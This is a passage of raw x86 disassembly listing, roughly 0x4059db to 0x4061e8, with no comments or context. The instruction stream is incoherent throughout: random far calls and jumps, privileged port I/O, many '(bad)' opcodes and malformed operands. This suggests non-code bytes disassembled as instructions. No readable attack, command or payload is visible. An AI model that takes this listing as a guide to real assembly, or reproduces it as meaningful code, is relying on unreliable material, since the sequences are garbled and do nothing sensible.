  4059db:	jl     0x4059ca
  4059dd:	sti    
  4059de:	out    0x96,al
  4059e0:	push   eax
  4059e1:	add    cl,bl
  4059e3:	or     eax,0x2c5e0166
  4059e8:	in     al,0x94
  4059ea:	xchg   esp,eax
  4059eb:	sub    dl,BYTE PTR [eax-0x1d]
  4059ee:	xchg   BYTE PTR [eax],ah
  4059f0:	xchg   edx,eax
  4059f1:	inc    ebx
  4059f2:	or     esi,0xab4c1c22
  4059f8:	(bad)  
  4059f9:	mov    ch,0x86
  4059fb:	push   edx
  4059fc:	in     eax,0xbd
  4059fe:	dec    ebx
  4059ff:	ficomp WORD PTR [eax-0x41]
  405a02:	inc    sp
  405a04:	punpckhwd mm4,mm2
  405a07:	inc    ecx
  405a08:	adc    dl,al
  405a0a:	adc    DWORD PTR [ebp+ecx*8+0x16],esp
  405a0e:	out    0xb3,eax
  405a10:	mov    ebx,cs
  405a12:	dec    ebp
  405a13:	add    DWORD PTR [edi+0x54],edx
  405a16:	xchg   esi,eax
  405a17:	mov    ds:0xae595af4,eax
  405a1c:	retf   0xf4ea
  405a1f:	inc    edi
  405a20:	pop    esi
  405a21:	ror    esi,cl
  405a23:	inc    edx
  405a24:	add    dl,BYTE PTR [ecx+0x54]
  405a27:	mov    eax,ds:0xffae67ee
  405a2c:	or     bl,BYTE PTR [esi]
  405a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2f:	(bad)  
  405a30:	jg     0x405a94
  405a32:	scas   al,BYTE PTR es:[edi]
  405a33:	push   esi
  405a34:	scas   eax,DWORD PTR es:[edi]
  405a35:	mov    ecx,edx
  405a37:	cmp    edi,DWORD PTR [ebp+ebx*8-0x57590669]
  405a3e:	inc    edi
  405a3f:	xchg   esi,eax
  405a40:	mov    esp,0x9e93ff91
  405a45:	xor    DWORD PTR [eax+edx*8-0x26],eax
  405a49:	loopne 0x4059ee
  405a4b:	mov    eax,ds:0x179f439a
  405a50:	pop    esp
  405a51:	and    BYTE PTR [ecx],bh
  405a53:	mov    bl,0x21
  405a56:	or     DWORD PTR [ebp+0x61],esp
  405a59:	push   esp
  405a5a:	jmp    0x5d81f6f6
  405a5f:	xor    edx,DWORD PTR ss:[ebx+0x5d40bf39]
  405a66:	or     ah,BYTE PTR [esi-0x53]
  405a69:	stos   DWORD PTR es:[edi],eax
  405a6a:	shr    BYTE PTR [esi+0x75],cl
  405a6d:	add    eax,0xb7fe87a
  405a72:	jecxz  0x405a10
  405a74:	adc    eax,0x61
  405a77:	jno    0x405a77
  405a79:	jge    0x405a0a
  405a7b:	sbb    al,0xe1
  405a7d:	mov    esp,0x7b3b52a8
  405a82:	sub    eax,0xbe171d9c
  405a87:	popw   ds
  405a89:	in     eax,0xb9
  405a8b:	or     eax,0xd90aa629
  405a90:	fnstenv [edi]
  405a92:	mov    al,ds:0xd64b2a76
  405a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a98:	sub    BYTE PTR [eax+0x77125042],0x7c
  405a9f:	mov    ch,0x31
  405aa1:	jmp    0x405b0e
  405aa3:	sub    eax,0xd6186d08
  405aa8:	or     DWORD PTR [ebx+0x2c],ecx
  405aab:	retf   0x7406
  405aae:	cdq    
  405aaf:	jl     0x405a57
  405ab1:	push   edx
  405ab2:	push   ds
  405ab3:	mov    cl,0x8e
  405ab5:	jnp    0x405aa8
  405ab7:	movq   mm3,mm0
  405aba:	sbb    DWORD PTR [eax+ebx*1+0x74981292],0xce44d674
  405ac5:	or     eax,0x213b92df
  405aca:	fnstcw WORD PTR [eax+eiz*4+0x5e83f3d]
  405ad1:	sub    edx,esp
  405ad3:	ss mov al,0xb
  405ad6:	pop    ecx
  405ad7:	push   esi
  405ad8:	in     al,0x3d
  405ada:	ret    0xd1c2
  405add:	mov    al,ds:0x27436d35
  405ae2:	ret    0x6aa7
  405ae5:	test   BYTE PTR [ecx],ah
  405ae7:	popa   
  405ae8:	adc    al,al
  405aea:	cmp    DWORD PTR [edi+0x36],esi
  405aed:	mov    dl,0x96
  405aef:	mov    ds:0x7d92389,eax
  405af4:	inc    ebp
  405af5:	retf   0xcf09
  405af8:	sbb    dl,ah
  405afa:	shr    DWORD PTR [esi+eiz*2-0x4c],cl
  405afe:	call   0xeda5:0xed21a719
  405b05:	cmp    bl,BYTE PTR [ebx]
  405b07:	sbb    BYTE PTR [ebp-0xd9c2ff],ch
  405b0d:	inc    edi
  405b0e:	loopne 0x405b0e
  405b10:	test   eax,0xbd158803
  405b15:	mov    es,eax
  405b17:	mov    eax,0x3c908b50
  405b1c:	pusha  
  405b1d:	ss dec ecx
  405b1f:	(bad)  
  405b20:	stos   BYTE PTR es:[edi],al
  405b21:	sub    DWORD PTR [esi+0x58],ebp
  405b24:	sub    eax,0xdf06fd0a
  405b29:	pusha  
  405b2a:	cmp    al,BYTE PTR cs:[ebx+0x527fb31d]
  405b31:	dec    esi
  405b32:	xchg   ecx,eax
  405b33:	dec    edi
  405b34:	popf   
  405b35:	adc    ch,BYTE PTR [esi+0x5b]
  405b38:	sub    eax,ebx
  405b3a:	xor    eax,0x756d4f22
  405b3f:	fiadd  WORD PTR [eax-0x53db40bc]
  405b45:	or     BYTE PTR [esp+ebx*4-0x2f33b790],dh
  405b4c:	mov    dl,0xe9
  405b4e:	or     bl,BYTE PTR [edi+edx*8+0x6c49ac56]
  405b55:	rcr    BYTE PTR [edi+0x648c3aea],1
  405b5b:	fdivr  QWORD PTR [esi+ebx*1-0xb6ccbab]
  405b62:	jmp    0xb212:0x8b9424
  405b69:	loope  0x405b2d
  405b6b:	or     eax,0x11d2ff33
  405b70:	dec    esi
  405b71:	loop   0x405b34
  405b73:	mov    ebp,0x19502be9
  405b78:	hlt    
  405b79:	retf   0x8b19
  405b7c:	in     al,dx
  405b7d:	iret   
  405b7e:	imul   ebp,DWORD PTR [eax-0x5375d5c9],0x8a337f3d
  405b88:	mov    cl,0xa2
  405b8a:	mov    cs,WORD PTR [ecx]
  405b8c:	sahf   
  405b8d:	inc    esi
  405b8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b8f:	xchg   esi,esi
  405b91:	add    eax,0x305bcbca
  405b96:	aad    0x67
  405b98:	dec    eax
  405b99:	cmp    BYTE PTR [eax+0x59b75f48],ch
  405b9f:	sbb    eax,0xe0f7e57b
  405ba4:	push   0xffffffde
  405ba6:	jmp    0x3350:0xae3f4d79
  405bad:	jl     0x405b43
  405baf:	pop    es
  405bb0:	jmp    0x405bd6
  405bb2:	rcr    BYTE PTR [ecx],0x63
  405bb5:	in     ax,0x43
  405bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bb9:	sub    eax,0x8eb69d37
  405bbe:	xor    esi,0xffffffda
  405bc1:	outs   dx,BYTE PTR ds:[esi]
  405bc2:	pop    eax
  405bc3:	call   0x4698:0x1b0f5699
  405bca:	or     edi,ebp
  405bcc:	pusha  
  405bcd:	add    BYTE PTR [eax],0xb9
  405bd0:	inc    esi
  405bd1:	retf   
  405bd2:	data16 jns 0x405b84
  405bd5:	add    DWORD PTR [esi-0x30],ebp
  405bd8:	pusha  
  405bd9:	sbb    eax,0xbd6115c4
  405bde:	clc    
  405bdf:	shl    DWORD PTR [esi-0x36c209dc],cl
  405be5:	test   BYTE PTR [edx-0x2c9878ff],bl
  405beb:	sbb    esi,DWORD PTR [edx-0x19369b41]
  405bf1:	jmp    DWORD PTR [ebx+ebx*2]
  405bf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bf5:	cwde   
  405bf6:	mov    esi,0x9b1de83
  405bfb:	pop    edx
  405bfc:	lds    eax,FWORD PTR cs:[edi+0x11]
  405c00:	adc    esp,esi
  405c02:	dec    eax
  405c03:	or     al,0x38
  405c05:	enter  0x1437,0xdc
  405c09:	in     al,0x9a
  405c0b:	retf   
  405c0c:	and    dl,BYTE PTR [esi-0x52]
  405c0f:	push   ss
  405c10:	jns    0x405c01
  405c12:	inc    ebx
  405c13:	mov    al,0x46
  405c15:	out    dx,eax
  405c16:	neg    cl
  405c18:	aad    0x34
  405c1a:	call   0x3107:0x1aefcabf
  405c21:	ret    
  405c22:	jl     0x405bca
  405c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c25:	or     eax,0x146ae3e4
  405c2a:	sbb    BYTE PTR [esi+0x5fb5c426],ch
  405c30:	aaa    
  405c31:	(bad)  
  405c32:	mov    ebp,DWORD PTR [edx]
  405c34:	jo     0x405c70
  405c36:	pop    edi
  405c37:	push   edx
  405c38:	push   ds
  405c39:	repnz dec ecx
  405c3b:	sbb    al,0x98
  405c3d:	or     eax,0x20084c3d
  405c42:	outs   dx,DWORD PTR ds:[esi]
  405c43:	arpl   WORD PTR [edi-0x25],dx
  405c46:	je     0x405c7d
  405c48:	(bad)  
  405c49:	xor    edx,ebp
  405c4b:	fisubr DWORD PTR [esi+0x17acaf71]
  405c51:	cmp    al,0x2c
  405c53:	dec    ebx
  405c54:	lds    edx,FWORD PTR [eax+0x17036d58]
  405c5a:	sbb    BYTE PTR [ebx-0x62],0x11
  405c5e:	add    DWORD PTR [eax+0x70],esp
  405c61:	push   cs
  405c62:	jmp    0xadb767e8
  405c67:	sbb    eax,0x3e463ade
  405c6c:	push   eax
  405c6d:	xchg   esi,eax
  405c6e:	pop    ecx
  405c6f:	adc    DWORD PTR [ebx+edi*8+0x68],ebx
  405c73:	mov    ds:0xed5a27c7,al
  405c78:	adc    BYTE PTR [ebx-0xd4397e7],bh
  405c7e:	mov    ah,BYTE PTR [edx]
  405c80:	dec    esp
  405c81:	inc    ebx
  405c82:	jl     0x405cf8
  405c84:	enter  0x110b,0x93
  405c88:	sti    
  405c89:	mov    dl,0x1e
  405c8b:	cli    
  405c8c:	jno    0x405cea
  405c8e:	and    eax,0x645f9205
  405c93:	pop    eax
  405c94:	lahf   
  405c95:	in     al,0x1d
  405c97:	push   esi
  405c98:	test   DWORD PTR [ecx],ebx
  405c9a:	cdq    
  405c9b:	dec    ebx
  405c9c:	add    edx,ebp
  405c9e:	jl     0x405cc2
  405ca0:	loope  0x405c62
  405ca2:	and    DWORD PTR [edx-0x416d9716],esp
  405ca8:	imul   ecx,DWORD PTR [eax],0x571b06b9
  405cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405caf:	nop
  405cb0:	fst    st(2)
  405cb2:	icebp  
  405cb3:	xchg   ebx,eax
  405cb4:	or     DWORD PTR ds:0xba091546,0x7ce28e8a
  405cbe:	inc    edi
  405cbf:	inc    ebx
  405cc0:	nop
  405cc1:	cs mov bl,0xfe
  405cc4:	cmp    ebp,DWORD PTR [ebp+0x65813a3e]
  405cca:	sahf   
  405ccb:	popa   
  405ccc:	ret    0xb362
  405ccf:	arpl   WORD PTR [edi-0x72],ax
  405cd2:	(bad)  
  405cd3:	mov    ecx,0x9b000b5a
  405cd8:	shl    BYTE PTR [esp+ecx*4-0x64],0x8f
  405cdd:	mov    dl,0x28
  405cdf:	imul   ecx,DWORD PTR [edi+0x23a3e709],0xffffff9e
  405ce6:	mov    ds:0x44855b14,eax
  405ceb:	xor    al,BYTE PTR [eax-0x23]
  405cee:	out    dx,al
  405cef:	rcr    BYTE PTR [ebp+0x4],1
  405cf2:	xor    ah,BYTE PTR [ebp-0x10a772e6]
  405cf8:	jle    0x405ce3
  405cfa:	sti    
  405cfb:	push   ebx
  405cfc:	sbb    al,0xbe
  405cfe:	jmp    0x808f:0x1d7c59f5
  405d05:	sbb    esi,0xffffff96
  405d08:	mul    bl
  405d0a:	xchg   edi,eax
  405d0b:	std    
  405d0c:	ins    BYTE PTR es:[edi],dx
  405d0d:	hlt    
  405d0e:	mov    dh,bl
  405d10:	aas    
  405d11:	fimul  WORD PTR [esi-0x51]
  405d14:	rcl    DWORD PTR [ebp+0x6f7dfacd],1
  405d1a:	ret    
  405d1b:	mov    dl,0x49
  405d1d:	mov    eax,ds:0x222e48a0
  405d22:	pop    ebp
  405d23:	pop    ecx
  405d24:	gs test eax,0x82010f32
  405d2a:	sub    al,0x10
  405d2c:	jg     0x405dac
  405d2e:	push   eax
  405d2f:	push   ss
  405d30:	ror    DWORD PTR [ebp-0x6dfc3da7],0xea
  405d37:	(bad)  
  405d38:	sbb    eax,0x18bd523b
  405d3d:	jp     0x405d10
  405d3f:	ficomp DWORD PTR ds:[esi+0x192c0b74]
  405d46:	add    eax,0x8ad1435f
  405d4b:	jg     0x405d3c
  405d4d:	retf   0x6f9d
  405d50:	xchg   edx,eax
  405d51:	xchg   BYTE PTR [esi-0x4a],ch
  405d54:	out    0x85,eax
  405d56:	and    esi,ecx
  405d58:	loopne 0x405cf8
  405d5a:	jns    0x405d59
  405d5c:	push   cs
  405d5d:	mov    ecx,0x5d2fcd4f
  405d62:	jge    0x405d6a
  405d64:	push   esi
  405d65:	fiadd  WORD PTR [esi]
  405d67:	inc    ebx
  405d68:	sub    bh,dl
  405d6a:	mov    eax,0x18682b56
  405d6f:	(bad)  
  405d70:	dec    ebx
  405d71:	ss jb  0x405da8
  405d74:	mov    ch,0x51
  405d76:	cmp    eax,0xe337f441
  405d7b:	cli    
  405d7c:	pop    ds
  405d7d:	jecxz  0x405ddf
  405d7f:	mov    BYTE PTR [ecx+0x3ca22348],dl
  405d85:	mov    al,0xa8
  405d87:	cmp    ebp,DWORD PTR [ebp-0x7b16ab40]
  405d8d:	inc    esi
  405d8e:	mov    ds:0x98bfd771,eax
  405d93:	pop    esp
  405d94:	inc    eax
  405d95:	cs mov ecx,0xaf9afb87
  405d9b:	xchg   edx,eax
  405d9c:	cs adc eax,0x333b503a
  405da2:	xchg   esi,eax
  405da3:	xchg   ebx,ebp
  405da5:	(bad)  
  405da6:	loope  0x405da4
  405da8:	lock fwait
  405daa:	arpl   sp,dx
  405dac:	mov    bh,0xfd
  405dae:	pop    eax
  405daf:	int    0x4
  405db1:	xor    DWORD PTR gs:[ebx+edx*2],0xffffffa8
  405db6:	add    eax,DWORD PTR [eax-0x629e653e]
  405dbc:	jnp    0x405dca
  405dbe:	or     BYTE PTR [edx-0x3495e57],ah
  405dc4:	mov    al,0x30
  405dc6:	add    al,0x17
  405dc8:	pop    ebx
  405dc9:	sbb    BYTE PTR [eax+0x1fd0164a],0x81
  405dd0:	ds inc edi
  405dd2:	mov    al,0x17
  405dd4:	mov    al,ds:0xe84ae362
  405dd9:	ret    0x815c
  405ddc:	xchg   ebx,eax
  405ddd:	pop    ecx
  405dde:	mov    ah,0x6b
  405de0:	push   edx
  405de1:	or     DWORD PTR [ebp-0x7455b25d],0x21b4ba9a
  405deb:	mov    dh,0x7b
  405ded:	clc    
  405dee:	dec    ebp
  405def:	push   edx
  405df0:	jle    0x405e24
  405df2:	fcom   QWORD PTR ds:0x15077ad1
  405df8:	outs   dx,BYTE PTR ds:[esi]
  405df9:	mov    ds:0xa314a818,al
  405dfe:	ins    BYTE PTR es:[edi],dx
  405dff:	rol    BYTE PTR [ebp-0x2df5f901],1
  405e05:	cwde   
  405e06:	dec    ebp
  405e07:	sub    al,0x8b
  405e09:	push   ds
  405e0a:	ret    
  405e0b:	inc    eax
  405e0c:	ret    
  405e0d:	jne    0x405e1a
  405e0f:	mov    edi,?
  405e11:	test   BYTE PTR ds:0x47b6993f,bl
  405e17:	aad    0x89
  405e19:	pop    edx
  405e1a:	fsub   st,st(3)
  405e1c:	addr16 jae 0x405db6
  405e1f:	ss pop ss
  405e21:	xlat   BYTE PTR ds:[ebx]
  405e22:	leave  
  405e23:	test   BYTE PTR [esi-0x21],ah
  405e26:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  405e28:	scas   eax,DWORD PTR es:[edi]
  405e29:	(bad)  
  405e2a:	je     0x405e5f
  405e2c:	aas    
  405e2d:	dec    esp
  405e2e:	fisub  WORD PTR ds:0xce1edd40
  405e34:	fnsave [ebx+0x2e]
  405e37:	cli    
  405e38:	inc    ch
  405e3a:	dec    esp
  405e3b:	adc    esi,edx
  405e3d:	adc    al,0x5e
  405e3f:	adc    ebx,edi
  405e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e42:	cmpps  xmm4,XMMWORD PTR [edi+0x42a1c80c],0x7c
  405e4a:	mov    ebp,0x73380d28
  405e4f:	mov    gs,WORD PTR [esi+0x471564e6]
  405e55:	mov    ah,0xa2
  405e57:	lods   eax,DWORD PTR ds:[esi]
  405e58:	mov    al,0xf4
  405e5a:	lock mov esi,?
  405e5d:	jp     0x405edb
  405e5f:	push   edi
  405e60:	or     al,0x60
  405e62:	inc    esi
  405e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e64:	xor    DWORD PTR [ecx],edx
  405e66:	mov    al,ds:0x3625cced
  405e6b:	ins    DWORD PTR es:[edi],dx
  405e6c:	out    dx,eax
  405e6d:	add    al,bl
  405e6f:	fild   WORD PTR [esi+0x734651ba]
  405e75:	and    BYTE PTR ds:0x249f92b5,cl
  405e7b:	mov    ss,ebx
  405e7d:	out    dx,eax
  405e7e:	out    dx,al
  405e7f:	outs   dx,BYTE PTR ds:[esi]
  405e80:	loop   0x405ea5
  405e82:	mov    dh,0x2b
  405e84:	jae    0x405e84
  405e86:	push   ds
  405e87:	mov    ebx,0xe7ec0ad9
  405e8c:	imul   ebp,DWORD PTR [esi+0x2e],0xfffffff7
  405e90:	addr16 inc edi
  405e92:	pop    ds
  405e93:	mov    dh,BYTE PTR [esi-0x36631cbc]
  405e99:	icebp  
  405e9a:	inc    esi
  405e9b:	test   eax,0xd8f56cbd
  405ea0:	jno    0x405ed4
  405ea2:	sbb    DWORD PTR [esi],ebx
  405ea4:	test   DWORD PTR [edi+0x44],0xc9b168ed
  405eab:	mov    eax,0xad77c6f0
  405eb0:	dec    esi
  405eb1:	add    eax,0xc8d70568
  405eb6:	inc    edi
  405eb7:	adc    eax,0x57ecb0d9
  405ebc:	and    edx,ebx
  405ebe:	and    esi,DWORD PTR [ebx+eax*4+0x4e1994ce]
  405ec5:	push   0xd5f7d79d
  405eca:	out    dx,eax
  405ecb:	or     al,0x8b
  405ecd:	das    
  405ece:	addr16 js 0x405f05
  405ed1:	push   ebp
  405ed2:	lea    edx,[esp+esi*4+0x3f3d27d4]
  405ed9:	(bad)  
  405eda:	mov    al,ds:0x4f61bddb
  405edf:	ror    BYTE PTR [eax],cl
  405ee1:	or     DWORD PTR [eax+0x58535ccf],eax
  405ee7:	adc    ch,bh
  405ee9:	dec    esi
  405eea:	mov    cl,0xf6
  405eec:	or     ebx,DWORD PTR [ebx-0x54]
  405eef:	call   0x150c4ac4
  405ef4:	dec    ebx
  405ef5:	call   0xe58:0x6daa5e96
  405efc:	ins    BYTE PTR es:[edi],dx
  405efd:	outs   dx,DWORD PTR ds:[esi]
  405efe:	sbb    bh,BYTE PTR [ebx-0x7f47de7c]
  405f04:	daa    
  405f05:	mov    ebp,DWORD PTR [ecx+0x271e22b5]
  405f0b:	fs xchg ecx,eax
  405f0d:	mov    ch,0xd0
  405f0f:	pop    ss
  405f10:	jno    0x405f0e
  405f12:	aaa    
  405f13:	or     DWORD PTR [ecx-0x33],eax
  405f16:	xchg   esp,eax
  405f17:	sbb    dh,al
  405f19:	mov    al,ds:0xd61c17c8
  405f1e:	push   edi
  405f1f:	adc    ecx,ebx
  405f21:	scas   eax,DWORD PTR es:[edi]
  405f22:	nop
  405f23:	pop    ebp
  405f24:	shr    BYTE PTR [ebp-0x55],1
  405f27:	sbb    BYTE PTR [ebx],bl
  405f29:	add    ah,ah
  405f2b:	cmc    
  405f2c:	push   edx
  405f2d:	stc    
  405f2e:	mov    esp,0x44b334c7
  405f33:	cmp    ch,BYTE PTR [ebx+0x7c]
  405f36:	pop    ds
  405f37:	or     BYTE PTR [edx],bl
  405f39:	cmc    
  405f3a:	or     DWORD PTR [ecx-0x57],esi
  405f3d:	mov    esp,DWORD PTR [esi+esi*2]
  405f40:	das    
  405f41:	push   ds
  405f42:	adc    al,0xc3
  405f44:	es xchg esp,eax
  405f46:	sub    DWORD PTR [eax-0x3e],0xffffffdf
  405f4a:	inc    ebp
  405f4b:	pop    ebx
  405f4c:	stc    
  405f4d:	dec    BYTE PTR [eax-0x38]
  405f50:	pop    esp
  405f51:	loopne 0x405fcf
  405f53:	div    DWORD PTR [ebp+0x3f2ed7cf]
  405f59:	fs push 0xeddd509f
  405f5f:	mov    eax,ds:0xaf03c1d0
  405f64:	ret    
  405f65:	and    DWORD PTR [edx+0x31],esi
  405f68:	push   ss
  405f69:	push   ebp
  405f6a:	(bad)  
  405f6b:	in     eax,0x4
  405f6d:	inc    ebx
  405f6e:	jne    0x405f71
  405f70:	pop    edi
  405f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f72:	stos   DWORD PTR es:[edi],eax
  405f73:	inc    esi
  405f74:	cmp    BYTE PTR [ecx+0x26ca552f],al
  405f7a:	adc    eax,0xf17d57ff
  405f7f:	imul   edx,DWORD PTR [edi+0x38],0x77a115a7
  405f86:	xor    al,0x42
  405f88:	stos   DWORD PTR es:[edi],eax
  405f89:	pop    ss
  405f8a:	or     ecx,DWORD PTR [eax+0x17a056ff]
  405f90:	aas    
  405f91:	sti    
  405f92:	repnz imul BYTE PTR es:0xcc9350df
  405f9a:	es clc 
  405f9c:	fisub  WORD PTR [ebp+eax*4-0x5cd00512]
  405fa3:	adc    BYTE PTR [esi],ah
  405fa5:	and    BYTE PTR [ebp+0x125e1430],bl
  405fab:	adc    eax,0x534d787b
  405fb0:	lds    ebp,FWORD PTR [eax+0x10d06b23]
  405fb6:	jae    0x405f93
  405fb8:	sub    eax,0xee45f76d
  405fbd:	dec    edi
  405fbe:	sub    eax,0x5d298b39
  405fc3:	cwde   
  405fc4:	mov    dl,0x3
  405fc6:	stos   DWORD PTR es:[edi],eax
  405fc7:	xchg   edx,eax
  405fc8:	lldt   WORD PTR [eax+0x1251ff09]
  405fcf:	stos   DWORD PTR es:[edi],eax
  405fd0:	jae    0x405fd3
  405fd2:	or     cl,bh
  405fd4:	inc    edx
  405fd5:	xchg   ecx,eax
  405fd6:	(bad)  
  405fd7:	xor    esi,DWORD PTR [esi-0x2]
  405fda:	shl    ebp,cl
  405fdc:	inc    ecx
  405fdd:	xchg   ebp,eax
  405fde:	mov    bh,0x8a
  405fe0:	xchg   esi,eax
  405fe1:	fistp  QWORD PTR [edi-0x5f]
  405fe4:	dec    ecx
  405fe5:	test   al,0x9b
  405fe7:	lahf   
  405fe8:	fldenv [edx+edi*8]
  405feb:	popa   
  405fec:	xchg   edx,eax
  405fed:	xor    bl,ah
  405fef:	sbb    eax,DWORD PTR [ebx]
  405ff1:	das    
  405ff2:	push   ebx
  405ff3:	mov    ah,BYTE PTR gs:[ebx+0x49]
  405ff7:	add    al,0x7c
  405ff9:	call   0xd4a2:0xf8188bdf
  406000:	jbe    0x406003
  406002:	add    dl,BYTE PTR ds:0x20952275
  406008:	es into 
  40600a:	add    eax,0x4c5c24c9
  40600f:	sub    dh,al
  406011:	mul    DWORD PTR [edx+ecx*4]
  406014:	scas   eax,DWORD PTR es:[edi]
  406015:	(bad)  
  406016:	ficomp WORD PTR [ecx+0x15]
  406019:	sbb    BYTE PTR [ebp+0x56244919],ch
  40601f:	mov    DWORD PTR [edi],ecx
  406021:	mov    ds:0x2553887,eax
  406026:	xor    BYTE PTR [eax],al
  406028:	cmp    eax,DWORD PTR [ebx+0x66]
  40602b:	pop    ds
  40602c:	mov    al,BYTE PTR [ebp-0x12723983]
  406032:	jle    0x405fe9
  406034:	ja     0x40600a
  406036:	pop    ss
  406037:	add    bh,BYTE PTR [ebp-0x3fb779a0]
  40603d:	add    eax,DWORD PTR [edi-0x22]
  406040:	push   ds
  406041:	lahf   
  406042:	aaa    
  406043:	push   esp
  406044:	dec    ebx
  406045:	rol    DWORD PTR [ebx+0x45b4c31b],cl
  40604b:	inc    edx
  40604c:	xchg   edi,eax
  40604d:	mov    edi,0xbe151f9d
  406052:	(bad)  
  406053:	(bad)  
  406054:	push   edi
  406055:	xor    BYTE PTR [esi],bh
  406057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406058:	(bad)  
  406059:	adc    eax,esp
  40605b:	pop    esi
  40605c:	push   edx
  40605d:	les    esi,FWORD PTR [ebx+eax*2+0x16]
  406061:	dec    edx
  406062:	repz pop ss
  406064:	adc    bl,BYTE PTR [eax+edi*8-0x54b9f4d]
  40606b:	sub    al,0xc3
  40606d:	mov    BYTE PTR [edi],bh
  40606f:	aas    
  406070:	fldenv [edi-0x19]
  406073:	xchg   ebp,eax
  406074:	lds    ecx,FWORD PTR [eax+0x756e6534]
  40607a:	sbb    DWORD PTR [eax],0x35
  40607d:	add    DWORD PTR [ecx+0x4f71535d],esi
  406083:	fst    QWORD PTR [edx+0x3ed90f97]
  406089:	cmc    
  40608a:	(bad)  
  40608b:	mov    ch,0x5e
  40608d:	xor    eax,0x30d0e54c
  406092:	adc    dl,BYTE PTR [ecx+0xf]
  406095:	es mov ch,0x3
  406098:	mov    eax,0xa45a0e20
  40609e:	inc    DWORD PTR [edi+0x13]
  4060a1:	or     BYTE PTR [esp+ecx*4+0xa],bl
  4060a5:	jns    0x406037
  4060a7:	test   al,0xdc
  4060a9:	mov    dh,0x9c
  4060ab:	mov    dh,0x55
  4060ad:	call   0x22a1fb24
  4060b2:	sub    DWORD PTR [ebp+0x32f8511f],edi
  4060b8:	sub    esi,DWORD PTR [edi]
  4060ba:	(bad)  
  4060bb:	(bad)  [eax]
  4060bd:	nop
  4060be:	dec    esp
  4060bf:	mov    al,0x62
  4060c1:	mul    DWORD PTR [esi+eax*2-0x34]
  4060c5:	jae    0x406047
  4060c7:	scas   eax,DWORD PTR es:[edi]
  4060c8:	and    bh,ah
  4060ca:	and    al,0xbc
  4060cc:	sub    DWORD PTR [eax-0x627f1eda],esp
  4060d2:	cmp    ecx,DWORD PTR [edx-0x15600f2a]
  4060d8:	ja     0x406135
  4060da:	sti    
  4060db:	push   ecx
  4060dc:	xchg   esp,eax
  4060dd:	icebp  
  4060de:	xor    DWORD PTR [ebx-0x1b5c7996],ebp
  4060e4:	add    eax,0x8ee20071
  4060e9:	mov    WORD PTR [ebp+0xef9b775],ss
  4060ef:	sti    
  4060f0:	pop    ss
  4060f1:	and    eax,0xc9dc07ab
  4060f6:	xchg   edx,eax
  4060f7:	repnz inc eax
  4060f9:	aas    
  4060fa:	pusha  
  4060fb:	mov    esi,0xc779d834
  406100:	push   ecx
  406101:	inc    ebp
  406102:	add    bh,BYTE PTR ds:0x9a88d409
  406108:	xchg   DWORD PTR [edi+0x13],edi
  40610b:	adc    BYTE PTR [ecx+0x7d],cl
  40610e:	inc    ebp
  40610f:	adc    ebp,esp
  406111:	sysret 
  406113:	popa   
  406114:	imul   esi,ebx,0x767c51d2
  40611a:	dec    ebp
  40611b:	xchg   ecx,eax
  40611c:	out    0xfe,eax
  40611e:	mov    bh,0x71
  406120:	(bad)  [edx+edi*8+0x79]
  406124:	int    0x24
  406126:	aam    0x77
  406128:	outs   dx,DWORD PTR ds:[esi]
  406129:	std    
  40612a:	cmp    DWORD PTR [ebx-0x22f01b81],ebx
  406130:	jle    0x406104
  406132:	cmp    esi,DWORD PTR [ebx+0x527d3087]
  406138:	xchg   ecx,eax
  406139:	or     BYTE PTR [eax+0x4d023fb2],ah
  40613f:	enter  0x3499,0xb4
  406143:	(bad)  
  406144:	push   edx
  406145:	aaa    
  406146:	push   es
  406147:	neg    ah
  406149:	sti    
  40614a:	pusha  
  40614b:	mov    edx,0x4c348efd
  406150:	push   es
  406151:	sbb    eax,0xac31fd19
  406156:	in     al,0x19
  406158:	test   DWORD PTR [esi-0x6d279a93],0x7ea1d524
  406162:	sub    BYTE PTR [eax+0x71a2f46],dl
  406168:	xor    ecx,edi
  40616a:	stos   DWORD PTR es:[edi],eax
  40616b:	enter  0xaf82,0xd1
  40616f:	push   ds
  406170:	(bad)  
  406171:	rcl    DWORD PTR [edx-0x5c7226b3],cl
  406177:	fwait
  406178:	or     al,0xdb
  40617a:	in     al,dx
  40617b:	js     0x406106
  40617d:	sub    DWORD PTR [edx-0x31],0x4c479849
  406184:	pop    esp
  406185:	pusha  
  406186:	lahf   
  406187:	mov    ecx,0x2cf7a905
  40618c:	leave  
  40618d:	push   edx
  40618e:	xor    DWORD PTR [ebp+0x53d09954],ebp
  406194:	sub    edi,DWORD PTR gs:[ebx-0x75]
  406198:	xchg   edx,eax
  406199:	ror    edi,1
  40619b:	pop    edx
  40619c:	stos   BYTE PTR es:[edi],al
  40619d:	pop    edx
  40619e:	push   0xffffffa6
  4061a0:	adc    al,0x25
  4061a2:	inc    ecx
  4061a3:	imul   edx,DWORD PTR [edx],0x75fad96f
  4061a9:	jge    0x406219
  4061ab:	aaa    
  4061ac:	pop    ecx
  4061ad:	jnp    0x4061f6
  4061af:	ins    BYTE PTR es:[edi],dx
  4061b0:	pop    es
  4061b1:	nop
  4061b2:	fbld   TBYTE PTR ds:0xc0aa50c3
  4061b8:	(bad)  
  4061ba:	add    ecx,eax
  4061bc:	mov    ebp,0x8a7781bc
  4061c1:	jmp    0x3bc1:0x35538c29
  4061c8:	stos   DWORD PTR es:[edi],eax
  4061c9:	xor    eax,0xffffffd3
  4061cc:	or     cl,al
  4061ce:	(bad)  
  4061cf:	cmp    esi,DWORD PTR [esi-0xdb5a07c]
  4061d5:	bound  ebx,QWORD PTR [edx+esi*8]
  4061d8:	pop    ebp
  4061d9:	push   ebp
  4061da:	xchg   BYTE PTR [edi-0x38],dl
  4061dd:	mov    WORD PTR ds:0xb33e2008,ss
  4061e3:	call   0x87e9e23e
  4061e8:	sub    ah,BYTE PTR [ecx-0x2c]
